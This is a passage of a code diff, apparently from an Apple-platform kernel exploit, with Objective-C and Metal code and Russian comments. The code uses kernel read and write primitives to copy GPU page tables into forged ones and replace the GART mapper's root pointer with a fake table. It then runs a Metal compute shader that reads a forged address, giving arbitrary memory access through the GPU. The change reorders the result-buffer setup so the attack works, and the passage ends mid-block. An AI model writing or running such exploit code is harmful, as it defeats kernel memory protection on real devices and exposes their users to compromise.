@@ -5407,7 +5407,22 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
         GNOTE( [NSString stringWithFormat:@"  phys: L1=%#llx L2=%#llx L3=%#llx target=%#llx", paL1, paL2, paL3, paT]);
         if (!paL1 || !paL2 || !paL3 || !paT) { GNOTE( @"FAIL: vtophys"); gGartLive = NO; return r; }
 
-        // фейк-таблицы = ПОЛНЫЕ копии реальных (чужие маппинги не ломаем)
+        // Metal result-буфер СНАЧАЛА — его PTE должна существовать в реальных
+        // таблицах ДО копий (иначе GPU не запишет ответ — был ноль)
+        __block uint64_t result = 0;
+        __block id<MTLBuffer> rbuf = nil;
+        __block id<MTLDevice> gMtl = nil;
+        @autoreleasepool {
+            gMtl = MTLCreateSystemDefaultDevice();
+            rbuf = gMtl ? [gMtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared] : nil;
+        }
+        if (!rbuf) { GNOTE( @"FAIL: result buf"); gGartLive = NO; return r; }
+        uint64_t rVA = rbuf.gpuAddress;
+        memset(rbuf.contents, 0xAB, 0x4000); // форсим реальный маппинг
+        GNOTE( [NSString stringWithFormat:@"  result buf VA=%#llx (pc=%llu pd=%llu pt=%llu)", rVA,
+                   (rVA >> 36) & 0x7FF, (rVA >> 25) & 0x7FF, (rVA >> 14) & 0x7FF]);
+
+        // фейк-таблицы = ПОЛНЫЕ копии реальных (уже с PTE result-буфера!)
         kreadbuf(L1arr, fakeL1, 0x4000);
         kreadbuf(L2, fakeL2, 0x4000);
         kreadbuf(L3, fakeL3, 0x4000);
@@ -5415,30 +5430,30 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
         *(uint64_t *)(fakeL1 + 16 * 8) = (paL2 & 0xFFFFFFFFF000ULL) | 3;
         *(uint64_t *)(fakeL2 + 0)     = (paL3 & 0xFFFFFFFFF000ULL) | 3;
         *(uint64_t *)(fakeL3 + 100 * 8) = (paT & 0xFFFFFFFFF000ULL) | attrs;
+        // проверка: PTE result-буфера в фейк-цепочке существует
+        uint64_t rpt = (rVA >> 14) & 0x7FF;
+        uint64_t rPTE = *(uint64_t *)(fakeL3 + rpt * 8);
+        GNOTE( [NSString stringWithFormat:@"  PTE result-буфера в фейк-L3[%llu]=%#llx %@", rpt, rPTE,
+                   rPTE ? @"ok" : @"ОТСУТСТВУЕТ (dispatch не запишет ответ!)"]);
 
-        // Metal: result-буфер ДО подмены (его PTE скопирована в фейк-цепочку)
-        __block uint64_t result = 0;
         @autoreleasepool {
-            id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
-            id<MTLBuffer> rbuf = mtl ? [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared] : nil;
-            if (!rbuf) { GNOTE( @"FAIL: result buf"); }
-            else {
-                uint64_t rVA = rbuf.gpuAddress;
-                GNOTE( [NSString stringWithFormat:@"  result buf VA=%#llx (должен быть в pc=16/pd=0)", rVA]);
                 // подмена root: mapper+0x30 = kernel VA нашей fakeL1 (phystokv)
                 uint64_t origRoot = kp_rc_kread64(mapper + 0x30);
                 uint64_t fakeRootKV = gPrimitives.phystokv(paL1);
                 GNOTE( [NSString stringWithFormat:@"  подмена root: %#llx → %#llx", origRoot, fakeRootKV]);
                 kp_rc_kwrite64(mapper + 0x30, fakeRootKV);
                 kp_rc_kread64(mapper + 0x30); // barrier
+                // map-триггер: новый крошечный буфер форсит gart invalidate/rebind
+                id<MTLBuffer> poke = [gMtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
+                GNOTE( [NSString stringWithFormat:@"  map-триггер (rebind): %@", poke ? @"ok" : @"FAIL"]);
                 // compute: читаем forged VA 0x10000064000 в out[0]
                 NSError *err = nil;
-                id<MTLLibrary> lib = [mtl newLibraryWithSource:
+                id<MTLLibrary> lib = [gMtl newLibraryWithSource:
                     @"kernel void rd(device ulong *out [[buffer(0)]]) { device ulong *p=(device ulong*)0x10000064000; out[0]=*p; }"
                     options:nil error:&err];
                 id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"rd"] : nil;
-                id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
-                id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
+                id<MTLComputePipelineState> pipe = fn ? [gMtl newComputePipelineStateWithFunction:fn error:&err] : nil;
+                id<MTLCommandQueue> q = pipe ? [gMtl newCommandQueue] : nil;
                 id<MTLCommandBuffer> cb = q ? [q commandBuffer] : nil;
                 id<MTLComputeCommandEncoder> enc = cb ? [cb computeCommandEncoder] : nil;
                 if (enc) {
